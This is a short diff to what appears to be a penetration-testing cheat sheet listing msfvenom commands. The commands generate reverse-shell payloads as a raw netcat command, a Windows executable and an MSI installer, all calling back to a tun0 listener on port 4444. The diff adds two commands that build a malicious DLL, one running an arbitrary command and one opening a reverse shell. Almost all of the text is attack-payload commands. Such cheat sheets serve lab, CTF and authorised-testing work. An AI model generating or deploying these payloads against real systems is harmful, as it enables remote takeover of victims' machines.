@@ -90,6 +90,9 @@ $ msfvenom -p cmd/unix/reverse_netcat LHOST=tun0 LPORT=4444 -f raw
 $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe
 # Generate a malicious installer (msi)
 $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f msi -o shell.msi
+# Generate a malicious dynamic library (DLL)
+$ msfvenom -p windows/x64/exec cmd='<some command>' -f dll -o malicious.dll
+$ msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f dll -o malicious.dll
 ```
 </div><div>
 
